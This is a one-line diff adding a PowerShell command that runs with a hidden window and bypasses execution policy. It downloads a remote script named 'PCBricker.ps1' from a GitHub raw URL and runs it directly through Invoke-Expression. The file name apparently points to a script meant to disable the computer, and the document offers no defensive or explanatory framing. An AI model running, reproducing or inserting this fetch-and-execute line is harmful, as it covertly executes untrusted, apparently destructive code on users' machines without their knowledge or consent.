@@ -1,0 +1,1 @@
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/termedyaboy/backatitboy/refs/heads/main/PCBricker.ps1' -UseBasicParsing | iex"
